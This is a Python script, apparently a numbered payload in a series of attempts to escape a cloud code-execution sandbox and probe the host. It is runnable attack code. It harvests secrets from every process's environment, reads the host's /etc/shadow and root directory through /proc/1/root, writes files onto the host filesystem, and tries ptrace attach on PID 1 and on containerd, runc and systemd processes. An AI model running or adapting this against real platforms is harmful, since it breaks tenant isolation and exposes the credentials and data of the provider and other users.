# -*- coding: utf-8 -*-
"""v97 payload: payload 自身直接宿主面探测 (免 cell API 绕道)
v95 结论: cell drive 容器 setuid(0)/sudo 提权成功; v95b 无 pid ns, uid0, 完整 caps;
          unshare -m/-U/-n 成功; mount 被 seccomp 拦(EPERM); /dev/vda(34G)+vdb(32G) 可读
v97: A 身份/caps  B 宿主进程全景+environ secrets 过滤  C /proc/1/root 逃逸 chroot
     D 写宿主 rootfs(经 /proc/1/root)  E /run 宿主面(cell.sock/containerd.sock)  F netns/挂载/网络
"""
import os, subprocess, time

OUT = '/vercel/sandbox/v97c.out'


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    try:
        open(OUT, 'a', encoding='utf-8', errors='replace').write(line + '\n')
    except Exception:
        pass
    try:
        print(line, flush=True)
    except Exception:
        pass


def sh(cmd, t=25):
    try:
        r = subprocess.run(['/bin/sh', '-c', cmd], capture_output=True, timeout=t)
        return (r.stdout or b'').decode(errors='replace') + (r.stderr or b'').decode(errors='replace')
    except subprocess.TimeoutExpired:
        return 'TIMEOUT'
    except Exception as e:
        return 'EXC:%s' % type(e).__name__


def run(tag, cmd, t=25):
    out = sh(cmd, t)
    log('%s OUT<<<\n%s\n>>>' % (tag, out[:3500]))
    return out


def main():
    log('V97 payload start pid=%d uid=%d gid=%d' % (os.getpid(), os.getuid(), os.getgid()))

    # A. 身份与能力
    run('A1', 'echo ===ID===; id; grep -E "Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs|Seccomp" /proc/self/status; '
              'echo ===CAPSH===; capsh --print 2>&1 | head -6')

    # B. 宿主进程全景 (无 pid ns, 与沙箱 init 同 namespace)
    run('B1', 'echo ===PID1===; tr "\\000" " " < /proc/1/cmdline 2>&1; echo; '
              'echo ===PS===; for p in /proc/[0-9]*; do pid=${p#/proc/}; '
              'exe=$(readlink -f $p/exe 2>/dev/null); cl=$(tr "\\000" " " < $p/cmdline 2>/dev/null | cut -c1-120); '
              'echo "$pid | $exe | $cl"; done | head -40')

    # B2. environ secrets 过滤 (截断 140 字符, 避免完整凭据落盘)
    run('B2', 'echo ===ENVSCAN===; for p in /proc/[0-9]*; do '
              'tr "\\000" "\\n" < $p/environ 2>/dev/null | grep -aiE "(token|secret|key|password|passwd|cookie|auth|credential)" | '
              'sed "s/^/[$p] /" | cut -c1-140; done | head -25')

    # C. /proc/1/root 逃逸 chroot 验证 + 宿主敏感文件
    run('C1', 'echo ===ROOTLS===; ls -la /proc/1/root/ 2>&1 | head -25; '
              'echo ===HOSTNAME===; cat /proc/1/root/etc/hostname 2>&1; '
              'echo ===HOSTS===; head -8 /proc/1/root/etc/hosts 2>&1; '
              'echo ===SHADOW===; head -3 /proc/1/root/etc/shadow 2>&1 | cut -c1-80; '
              'echo ===ROOTHOME===; ls -la /proc/1/root/root/ 2>&1 | head -15; '
              'echo ===VERCEL===; ls -la /proc/1/root/vercel/ 2>&1 | head -10')

    # D. 写宿主 rootfs (经 /proc/1/root, chroot 外写入验证)
    run('D1', 'echo ===WRITE_TMP===; echo V97_HOST_WRITE_MARKER_5566 > /proc/1/root/tmp/v97_write_test.txt 2>&1; '
              'echo rc=$?; ls -la /proc/1/root/tmp/v97_write_test.txt 2>&1; cat /proc/1/root/tmp/v97_write_test.txt 2>&1; '
              'echo ===WRITE_COW===; echo V97_COW_MARKER_7788 > /proc/1/root/vercel/sandbox/v97_from_payload.txt 2>&1; '
              'ls -la /vercel/sandbox/v97_from_payload.txt /proc/1/root/vercel/sandbox/v97_from_payload.txt 2>&1')

    # E. /run 宿主面
    run('E1', 'echo ===RUN===; ls -la /run/ 2>&1 | head -25; '
              'echo ===VERCELSHARE===; ls -la /run/vercel/ /run/vercel/share/ 2>&1 | head -30; '
              'echo ===CONTAINERD===; ls -la /run/containerd/ 2>&1 | head; '
              'echo ===CELL===; ls -la /run/cell/ 2>&1')

    # F. netns / 挂载 / 网络
    run('F1', 'echo ===NETNS===; ls -la /var/run/netns /run/netns 2>&1; '
              'echo ===MOUNTINFO===; cat /proc/self/mountinfo 2>&1 | head -30; '
              'echo ===IP===; ip -o addr 2>&1 | head -10; echo ===HOSTNAME===; hostname 2>&1')

    # G. ptrace 宿主进程 (无 pid ns + CAP_SYS_PTRACE => 可附加宿主控制面进程)
    try:
        import ctypes
        libc = ctypes.CDLL(None, use_errno=True)
        out = []
        cnt = 0
        for f in sorted(os.listdir('/proc')):
            if not f.isdigit():
                continue
            try:
                comm = open('/proc/%s/comm' % f).read().strip()
            except Exception:
                continue
            if f == '1' or comm in ('containerd', 'cell', 'runc', 'systemd', 'sandbox-init'):
                pid = int(f)
                ret = libc.ptrace(ctypes.c_int(16), ctypes.c_int(pid), ctypes.c_void_p(0), ctypes.c_void_p(0))
                if ret == 0:
                    time.sleep(0.2)
                    libc.ptrace(ctypes.c_int(17), ctypes.c_int(pid), ctypes.c_void_p(0), ctypes.c_void_p(0))
                    out.append('ATTACH_OK pid=%s comm=%s' % (f, comm))
                else:
                    out.append('attach_fail pid=%s comm=%s errno=%d' % (f, comm, ctypes.get_errno()))
                cnt += 1
                if cnt >= 5:
                    break
        log('G1 PTRACE<<<\n%s\n>>>' % '\n'.join(out))
    except Exception as e:
        log('G1 EXC %s' % type(e).__name__)

    log('V97C_DONE')


main()
